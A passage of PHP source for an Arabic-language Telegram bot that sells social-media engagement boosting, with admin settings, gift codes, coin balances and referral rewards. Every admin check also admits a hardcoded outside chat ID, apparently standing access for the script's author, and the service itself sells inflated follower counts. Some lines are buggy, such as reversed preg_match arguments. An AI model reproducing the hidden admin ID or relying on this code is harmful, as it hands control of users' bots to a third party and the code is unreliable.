     ارسل الان رقم الهاتف 
      *
      
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
           [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
      ]
      ])
      ]);
      $modes['mode'][$from_id]  = $data;
      $rshq= json_encode($rshq,32|128|265);
      file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }
  }
  
  if($text and $modes['mode'][$from_id] == "setphone"){
  if(is_numeric($text)){
    bot("sendmessage",[
      'chat_id'=>$chat_id,
      'text'=>"تم التعيين بنجاح رقم الهاتف هو *$text*",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
             [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
        ]
        ])
    ]);
    $rshq["phone"]  = $text;
    $modes['mode'][$from_id]  = null;
    $rshq= json_encode($rshq,32|128|265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
  }else{
    bot("sendmessage",[
      'chat_id'=>$chat_id,
      'text'=>"ارسل *الارقام* فقط عزيزي",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
             [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
        ]
        ])
    ]);
  
  }
  }

if($data == "sethdia"){
if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
  bot('EditMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"
    *
   ارسل الان عدد الهدیه الیومیه .
    *
    ",
    'parse_mode'=>"markdown",
    'reply_markup'=>json_encode([ 
    'inline_keyboard'=>[
         [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
    ]
    ])
    ]);
    $modes['mode'][$from_id]  = $data;
    $rshq= json_encode($rshq,32|128|265);
    file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
}
}

if($text and $modes['mode'][$from_id] == "sethdia"){
if(is_numeric($text)){
  bot("sendmessage",[
    'chat_id'=>$chat_id,
    'text'=>"تم التعيين بنجاح عدد الهديه اليوميه هو *$text*",
    'parse_mode'=>"markdown",
    'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
           [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
      ]
      ])
  ]);
  $rshq['hdias']  = $text;
  $modes['mode'][$from_id]  = null;
  $rshq= json_encode($rshq,32|128|265);
  file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
}else{
  bot("sendmessage",[
    'chat_id'=>$chat_id,
    'text'=>"ارسل *الارقام* فقط عزيزي",
    'parse_mode'=>"markdown",
    'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
           [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
      ]
      ])
  ]);

}
}

if($data == "infoRshq") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
		
		if($rshq["sToken"] == null){
			$sTok="مامخلي توكن موقع انت";
			}else{
				$sTok=$rshq["sToken"];
				}
				
				if($rshq["sToken"] == null){
			$Sdom="مامخلي دومين الموقع انت";
			}else{
				$Sdom=$rshq["sSite"];
				}
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
معلومات الرشق
*

توكن الموقع : `$sTok`
دومين موقع الرشق : `$Sdom`

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
]
])
]);
$modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
}
}



if($data == "token"  ) {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
ارسل الان توكن الموقع 🕸️
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = "sToken";
SETJSON($rshq); SETJSON12($modes);
} 
}

# - الملف كتابه بيرو @V44VV 
$rnd=rand(999,99999);
if($text and $modes['mode'][$from_id] == "sToken") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   
  تم تعيين توكن الموقع
 - - - - - - - - - - - - - - - - - - 
`$text`
 - - - - - - - - - - - - - - - - - - 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
$modes['mode'][$from_id]  = null;
$rshq["sToken"]  = $text;
SETJSON($rshq); SETJSON12($modes);
} 
}

if($data == "SiteDomen"  ) {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
ارسل الان رابط الموقع مال الرشق 🧾
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = "SiteDomen";
SETJSON($rshq); SETJSON12($modes);
} 
}

# - الملف كتابه بيرو @V44VV 
$rnd=rand(999,99999);
if($text and $modes['mode'][$from_id] == "SiteDomen") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
		$IMBERO = parse_url($text);
$INBERO = $IMBERO['host'];
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   
  تم تعيين موقع الرشق
 - - - - - - - - - - - - - - - - - - 
`$INBERO`
 - - - - - - - - - - - - - - - - - - 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
$modes['mode'][$from_id]  = null;
$rshq["sSite"]  = $INBERO;
SETJSON($rshq); SETJSON12($modes);
} 
}

if($data == "sCh"  ) {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
ارسل الان معرف القناة مع @ او بدون ⚜️
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = "sCh";
SETJSON($rshq); SETJSON12($modes);
} 
}

$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);
# - الملف كتابه بيرو @V44VV 
$rnd=rand(999,99999);
if($text and $modes['mode'][$from_id] == "sCh") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
		$text = str_replace("@",null,$text); 
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   
  تم تعيين قناة الاثباتات
 - - - - - - - - - - - - - - - - - - 
[@$text]
 - - - - - - - - - - - - - - - - - - 
 - تأكد من ان البوت مشرف بالقناة {⚠️}
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
$modes['mode'][$from_id]  = null;
$rshq["sCh"]  = "@".$text;
SETJSON($rshq); SETJSON12($modes);
} 
}
if($data == "hdiamk" ) {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
ارسل عدد ال$name3mla داخل الهديه 

*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = "hdiMk0";
SETJSON($rshq); SETJSON12($modes);
die();
} 
}

if ($text and $modes['mode'][$from_id] == "hdiMk0") {
    if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "
   
- ارسل الأن عدد الاشخاص لأستخدام الكود
  ",
            'parse_mode' => "markdown",
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [['text' => "$NamesBACK", 'callback_data' => "rshqG"]],
                ]
            ])
        ]);
        $modes['mode'][$from_id] = "hdiMk";
        $rshq['_HD'][$from_id] = $text;
        $rshq["Bero" . $rnd] = "on|$text";
        SETJSON($rshq);
        SETJSON12($modes);
        die();

    }
}

if ($text and $modes['mode'][$from_id] == "hdiMk") {
  if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568) {
      bot('sendMessage', [
          'chat_id' => $chat_id,
          'text' => "
 
- ارسل الأن أسم الكود مثلا ( BERO )
",
          'parse_mode' => "markdown",
          'reply_markup' => json_encode([
              'inline_keyboard' => [
                  [['text' => "$NamesBACK", 'callback_data' => "rshqG"]],
              ]
          ])
      ]);
      $modes['mode'][$from_id] = "hdiMk00";
      $rshq['hdiacount'][$from_id] = $text;
      SETJSON($rshq);
      SETJSON12($modes);
      die();
  }
}
# - الملف كتابة بيرو @V44VV

if ($text and $modes['mode'][$from_id] == "hdiMk00") {
    if ($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568) {
        if ($text) {
          $mts = $text;

            $text = $rshq['hdiacount'][$from_id];
            
            $text1 = $rshq['_HD'][$from_id];
            if ($mts and $text) {
                bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "
💳 كود جديد نقاط مجاناً 🎁
🔡] الكود : `" . $mts . "`
💰] عدد ال" . $name3mla . " : $text1
👤] عدد الأشخاص : ".$rshq['hdiacount'][$from_id]."
🩸البوت [@" . bot('getme')->result->username . "]
  ",
                    'parse_mode' => "markdown",
                    'reply_markup' => json_encode([
                        'inline_keyboard' => [
                            [['text' => "$NamesBACK", 'callback_data' => "rshqG"]],
                        ]
                    ])
                ]);
                $modes['mode'][$from_id] = null;
                $rshq[$mts] = "on|$text1|$text";
                $rshq["A#D" . $mts] = "$text";
                SETJSON($rshq);
                SETJSON12($modes);
            }
        } else {
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "
ارسل *الأرقام* فقط!!
   ",
                'parse_mode' => "markdown",
                'reply_markup' => json_encode([
                    'inline_keyboard' => [
                        [['text' => "$NamesBACK", 'callback_data' => "rshqG"]],
                    ]
                ])
            ]);
        }
    }
}

if($data == "onrshq") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568  ) {
//الملف كتابه بيرو  @v44vv - @Sero_Bots

    if($rshq["sSite"] != null and $rshq["sToken"] != null){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
تم فتح استقبال الرشق
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);
$rshq['rshqG']  = "on";
SETJSON($rshq); SETJSON12($modes);
      } else {
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
         لازم تكمل معلومات الرشق بلاول 
         - التوكن او دومين موقع الرشق مامحطوط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode([ 
          'inline_keyboard'=>[
            [['text'=>"معلومات حول الرشق 📋",'callback_data'=>"infoRshq" ]],
            [['text'=>"تعين توكن لموقع 🎟️",'callback_data'=>"token" ],['text'=>"تعين موقع الرشق ⚙️",'callback_data'=>"SiteDomen" ]],
            [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
          ]
          ])
          ]);
      }

}
}


if($data == "ontrend") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568  ) {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
تم فتح ترند اضهار اكثر المشاركين لرابط الدعوء بنجاح ! 🎉
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);

$rshq['trend'] = true;
SETJSON($rshq); SETJSON12($modes);
}
}

if($data == "oftrend") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568  ) {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
تم قفل اضهار ترند اكثر مشاركين لرابط الدعوى
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);

$rshq['trend'] = "x";
SETJSON($rshq); SETJSON12($modes);
}
}

# - الملف كتابه بيرو @V44VV
if($data == "ofrshq") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568  ) {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
تم قفل استقبال الرشق
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);

$rshq['rshqG']  = "of";
SETJSON($rshq); SETJSON12($modes);
}
}

if($data == "coins" ) {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
ارسل ايدي الشخص الان

*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = "coins";
SETJSON($rshq); SETJSON12($modes);
} 
}
if($text and $modes['mode'][$from_id] == "coins") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   
   ارسل عدد ال$name3mla لاضافته للشخص
   
اذا تريد تخصم كتب ويا - 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
$modes['mode'][$from_id]  = "coins2";
$rshq['id'][$from_id]  = "$text";
SETJSON($rshq); SETJSON12($modes);
} 
}

if($text and $modes['mode'][$from_id] == "coins2") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ){
        if($text != $rshq['id'][$from_id] ){
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   
  تم اضافه $text ل". $rshq['id'][$from_id]. "
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
        
      ]
    ])
]);
$modes['mode'][$from_id]  = null;
$rshq["coin"][$rshq['id'][$from_id]] += $text;
SETJSON($rshq); SETJSON12($modes);
        }
} 
}

$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);

$coin = $rshq["coin"][$from_id];
$bot_tlb = $rshq['bot_tlb'];
$mytl = $rshq["cointlb"][$from_id];
$share = $rshq["mshark"][$from_id] ;
$coinss = $rshq["coinss"][$from_id];
$tlby =$rshq["tlby"][$from_id];
if($rshq["coin"][$from_id] == null) {
	$coin = 0;
	}
	if($rshq["tlby"][$from_id] == null) {
	$tlby = 0;
	}
	if($rshq["coinss"][$from_id] == null) {
	$coinss = 0;
	}
	if($rshq["mshark"][$from_id] == null) {
	$share = 0;
	}
	if($rshq["cointlb"][$from_id] == null) {
	$mytl = 0;
	}
	if($rshq['bot_tlb'] == null) {
	$bot_tlb = 0;
	}

mkdir("FCZR/". bot("getme")->result->username) ;
$zr = json_decode(file_get_contents("FCZR/". bot("getme")->result->username. "/zr.json"),true);


if(explode(":",$data)[0] == "enter"){
    if($zr['infonam'][explode(":",$data)[1]]){
    
    if($zr['infosect'][explode(":",$data)[1]] == "edit"){
    	$fic = "editmessagetext";
    
    
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "send"){
    	$fic = "sendMessage";
    
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "hmsa"){
    	$fic = "answerCallbackQuery";
    
    }
   
    
    
    
    
    
    $k15[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"tobot"]];
    bot($fic,[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>$zr['infodesc'][explode(":",$data)[1]],
    'parse_mode'=>"MARKDOWN",
    'callback_query_id'=>$update->callback_query->id,
    'reply_markup'=>json_encode($k15),
    'show_alert'=>true,
	]);
} 
	}


	
  if($izr_sock['mode'] == "✅"){
	$key=[];
  $addedIds = [];
  $key[inline_keyboard][]=[['text'=>"الخدمات 🗂",'callback_data'=>"service"]];
  $key[inline_keyboard][]=[['text'=>"تجميع ✳️",'callback_data'=>"plus"], ['text'=>"الحساب 🗃",'callback_data'=>"acc"]];
  $key[inline_keyboard][]=[['text'=>"استخدام كود 💳",'callback_data'=>"hdia"], ['text'=>"تحويل $name3mla ♻️",'callback_data'=>"transer"]];
  $key[inline_keyboard][]=[['text'=>"معلومات الطلب 📥",'callback_data'=>"infotlb"],['text'=>"طلباتي 📮",'callback_data'=>"myrders"]];
  $key[inline_keyboard][]=[['text'=>"قناة البوت 🤍",'url'=>"$chabot.t.me"]];
  $key[inline_keyboard][]=[['text'=>"شحن $name3mla 💰",'callback_data'=>"buy"],['text'=>"الشروط 📜",'callback_data'=>"termss"]];
  $key[inline_keyboard][]=[['text'=>"عدد الطلبات : $bot_tlb ✅",'callback_data'=>"jj"]];
   
  }else{
    $key=[];
    $key[inline_keyboard][]=[['text'=>"",'callback_data'=>"jj"]];
  }
    foreach ($zr['id'] as $i){
    $namem = $zr['infonam'][$i];
    $biozr = $zr['infodesc'][$i];
    if (!in_array($i, $addedIds)) {
      $addedIds[] = $i;
    if(preg_match("#http#",$biozr)) {
    	
    $key[inline_keyboard][]=[[text=>"$namem",url=>$biozr]];

   } elseif(preg_match("/bero:/",$biozr)) {
    $decv = base64_decode(explode('bero:',$biozr)[1]);
    $key[inline_keyboard][]=[[text=>"$namem",callback_data=>"$decv" ]];
   }else{
   $key[inline_keyboard][]=[[text=>"$namem",callback_data=>"enter:$i" ]];
  } 
  
}
} 

$RBEROO = $key;

if(!$start_msg){
  $starts = "
🔹*اهلا بك عزيزي* {[$name](tg://user?id=$chat_id)}* 🎖في بوت خدمات $nambot *➢
⌯ يتوفر في البوت العديد من الخدمات الرائعة والمتنوعة بأسعار مناسبة✅
⌯┊💻يتوفر🫴🏼زياده متابعين انستا ~ تيليجرام ~ تيك توك ~ يوتيوت ~ توتير وغيرها📲
يتوفر 🎐رشق تصويتات تفاعلات تيليجرام ولايكات انستا ~ تيك توك وبرامج اخرى📑
🤏🏻يمكنك رشق مشاهدات تيليجرام مجانآ 💯
🔺*اكتشف باقي الخدمات بنفسك🎐من خلال الضغط على زر الخدمات*🛒
~ ".$name3mla."ك♻️ :$coin
~ ايديك `🆔 : `$from_id
 " ;
}else{
  $starts = $start_msg;
}
$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);

if($data == "myrders"){
  $count = 0;

  foreach ($tlbsme["orders"][$from_id] as $m) {
    // if ( ) { }
      $b .= "\n$m";
      $count++;
      if ($count >= 5) {
          break;
      }
  }
bot('editmessagetext',[
  'chat_id'=>$chat_id,
  'message_id' => $message_id,
  'text'=>"
📮] اخر 5 طلبات
$n
 ", 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"ارسال جميع الطلبات بصيغه الملف 🗂",'callback_data'=>"sendMeTxt|$from_id" ]],
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
       
      ]
    ])
]); 
}

if(explode("|", $data)[0] == "sendMeTxt") {
	
	$g=bot('editmessagetext',[
  'chat_id'=>$chat_id,
  'message_id' => $message_id,
  'text'=>"
  يتم الترتيب 📤
 ", 
 'parse_mode'=>"markdown",
]); 
foreach($tlbsme["orders"][$from_id] as $m){
  $b=$b."\n$m";
}
$rb = rand(999,99999);
file_put_contents("oRD(".$rb.")_$usrbot.txt",$b);
bot ("senddocument", [
"chat_id" => $chat_id, 
"caption" => "تم الارسال بنجاح (طلباتك)", 
"document" => new CURLFile("oRD(".$rb.")_$usrbot.txt") 
]) ;
bot('editmessagetext',[
  'chat_id'=>$chat_id,
  'message_id' => $g->result->message_id ,
  'text'=>"
  هذا هي طلباتك ✳️
$n
 ", 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"ارسال جميع الطلبات بصيغه الملف 📁",'callback_data'=>"sendMeTxt|$from_id" ]],
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
       
      ]
    ])
]); 
unlink("oRD(".$rb.")_$usrbot.txt");
  } 
  
  $JAWA = $rshq['JAWA'];
  
if($data == "termss"){
  if($rshq['KLISHA'] == null){
bot('editmessagetext',[
  'chat_id'=>$chat_id,
  'message_id' => $message_id,
  'text'=>"
شروط استخدام بوت $nambot 

- بوت $nambot اول بوت عربي في التلجرام مخصص لجميع خدمات برامج التواصل الاجتماعي انستقرام - تيك توك - يوتيوب - تيوتر - فيسبوك وللخ... هناك العديد من الشروط حول استخدام بوت $nambot.

- الامان والثقه الموضوع الاول لدينا وحماية خصوصية جميع المستخدمين من الاولويات لدينا لذالك جميع المعلومات من ال$name3mla والطلبات هي محصنة تماماً لا يسمح لـ اي شخص الاطلاع عليها الا في حالة طلب المستخدم ذالك من الدعم الفني

- على جميع المستخدمين التركيز في حالة طلب اي شيء من البوت في حالة كان حسابك او قناتك او ماشبه ذالك خاص سيلغي طلبك نهائياً لذالك لايوجد استرداد او اي تعويض لذالك وجب التنبيه

- جميع الخدمات تتحدث يومياً لا يوجد لدينا خدمات ثابته يتم اضافة يومياً العديد من الخدمات التي تكون مناسبة لجميع المستخدمين في البوت لنكون الاول والافضل دائماً

- لا يوجد اي استرداد او الغاء في حالة تم الرشق او الدعم لحساب او لقناة او لمنشور في الغلط 

- جميع الخدمات المتوفره هي موثوقه تماماً ويتم التجربه عليها قبل اضافاتها للبوت لذالك يتوفر انواع الخدمات بأسعار مختلفة من خدمة لخدمة اخرى

- قنوات بوت $nambot في التلجرام 
قناة بوت $nambot @$chabot القناة الرسميه التي يتم نشر بها جميع الخدمات والمعلومات حول بوت $nambot

قناة وكيل بوت $nambot ( @$chabot - @L_5_4 ) القناة الرسميه لوكيل بوت $nambot لذالك لا يتوفر لدينا سوا هذه القنوات المطروحه اعلاه واذا توفر لدينا اي قناة سنقوم بنشرها في قنواتنا الرسميه ليكون لدى جميع المستخدمين العلم بذالك

فريق بوت $nambot ✍
 ", 

 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
       
      ]
    ])
]); 
     }else{
       $k=$rshq['KLISHA'];
       bot('editmessagetext',[
        'chat_id'=>$chat_id,
        'message_id' => $message_id,
        'text'=>"
     $k
       ", 
      
       'reply_markup'=>json_encode([
           'inline_keyboard'=>[
           
           [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
             
             
            ]
          ])
      ]); 
     }
}

if($data == "JAWA"){
	if($rshq['JAWA'] == null) {
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
    'message_id' => $message_id,
    'text'=>"
لم يتم تعيين كليشه
   ", 
  
   'reply_markup'=>json_encode([
       'inline_keyboard'=>[
       
       [['text'=>"$NamesBACK",'callback_data'=>"linkme" ]],
         
         
        ]
      ])
  ]); 
 } else {
 	bot('editmessagetext',[
    'chat_id'=>$chat_id,
    'message_id' => $message_id,
    'text'=>$rshq['JAWA'], 
  
   'reply_markup'=>json_encode([
       'inline_keyboard'=>[
       
       [['text'=>"$NamesBACK",'callback_data'=>"linkme" ]],
         
         
        ]
      ])
  ]); 
} 
  }

$hHbero = $a3thu['HACKER'][$from_id];
$BERO = json_decode(file_get_contents("RSHQ/ALLS/".USR_BOT."/BERO.json"),1);
if($text == "/start" and $hHbero == "I") {
  $e[1] = $a3thu['HACK'][$from_id];
  $e1=$e[1];
  $e1 = str_replace(" ", null, $e1) ;
	if(true){
		if($e1 != $from_id) {
			if(!in_array($from_id , $a3thu["3thu"])){
				$c = $rshq["coinshare"]??"25";
				if (!in_array($e1 ,$BERO['BERO']['send']['uname'])){
$BERO['BERO']['send']['uname'][] = $e1 ;
$BERO['BERO']['send']['add'][] = 0;
file_put_contents("RSHQ/ALLS/".USR_BOT."/BERO.json",json_encode($BERO));

}
				if (in_array($e1,$BERO['BERO']['send']['uname'])){
$yes = array_search($e1,$BERO['BERO']['send']['uname']);
$BERO['BERO']['send']['add'][$yes]+=1;
file_put_contents("RSHQ/ALLS/".USR_BOT."/BERO.json",json_encode($BERO));
}
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
♦️لقد دخلت لرابط صديقك وحصل على $c $name3mla ✅

  ", 
  'parse_mode'=>"markdown",
]);
$cf = $rshq["coin"][str_replace(" ", null, $e1)] + $c;
bot('sendMessage',[
   'chat_id'=>str_replace(" ", null, $e1),
   'text'=>"
لقد حصلت على $c $name3mla من [". $update->message->from->first_name."](tg://user?id=$chat_id)

  ", 
  'parse_mode'=>"markdown",
]);
bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);

  $a3thu['HACKER'][$from_id] = null;
  $a3thu['HACK'][$from_id] = null;
$a3thu["3thu"][] = $from_id ;
$rshq["coin"][str_replace(" ", null, $e1)] += ($rshq["coinshare"]?? "25");
$rshq["mshark"][str_replace(" ", null, $e1)] += 1;
SETJSON($rshq); SETJSON12($modes);
file_put_contents("$a3thuFILE",json_encode($a3thu));
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
$a3thu['HACKER'][$from_id] = null;
$a3thu['HACK'][$from_id] = null;
file_put_contents("$a3thuFILE",json_encode($a3thu));
} 
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
لايمكنك الدخول لرابط الدعوه الخاص بك ⚠️
  ", 

]);
bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
$a3thu['HACKER'][$from_id] = null;
$a3thu['HACK'][$from_id] = null;
file_put_contents("$a3thuFILE",json_encode($a3thu)); 
} 
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
$a3thu['HACKER'][$from_id] = null;
$a3thu['HACK'][$from_id] = null;
SETJSON3($a3thu);
} 
} 

$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);

if($text == "MMTEST"){
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"
 $b
   ", 
   'parse_mode'=>"markdown",
 ]);
}
$BERO = json_decode(file_get_contents("RSHQ/ALLS/".USR_BOT."/BERO.json"),1);
$e=explode("|", $data) ;
$e1=str_replace("/start",null,$text); 
if($text == "/start$e1" and is_numeric($e1) and !preg_match($text,"#Bero#")) {
	if(true){
		$e1 = str_replace(" ", null, $e1) ;
		if($e1 != $from_id) {
			if(!in_array($from_id , $a3thu["3thu"])){
	$c = $rshq["coinshare"]??"25";
	
	if (!in_array($e1 ,$BERO['BERO']['send']['uname'])){
$BERO['BERO']['send']['uname'][] = $e1 ;
$BERO['BERO']['send']['add'][] = 0;
file_put_contents("RSHQ/ALLS/".USR_BOT."/BERO.json",json_encode($BERO));

}
				if (in_array($e1,$BERO['BERO']['send']['uname'])){
$yes = array_search($e1,$BERO['BERO']['send']['uname']);
$BERO['BERO']['send']['add'][$yes]+=1;
file_put_contents("RSHQ/ALLS/".USR_BOT."/BERO.json",json_encode($BERO));
}
	
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
♦️لقد دخلت لرابط صديقك وحصل علي $c $name3mla ✅

  ", 
  'parse_mode'=>"markdown",
]);
$cf = $rshq["coin"][str_replace(" ", null, $e1)] + $c;
bot('sendMessage',[
   'chat_id'=>str_replace(" ", null, $e1),
   'text'=>"
لقد🔹 حصلت على ( $c ) $name3mla من ( [". $update->message->from->first_name."](tg://user?id=$chat_id) ) قام بالدخول ع رابط الدعوة الخاص بك 🏆

  ", 
  'parse_mode'=>"markdown",
]);
bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
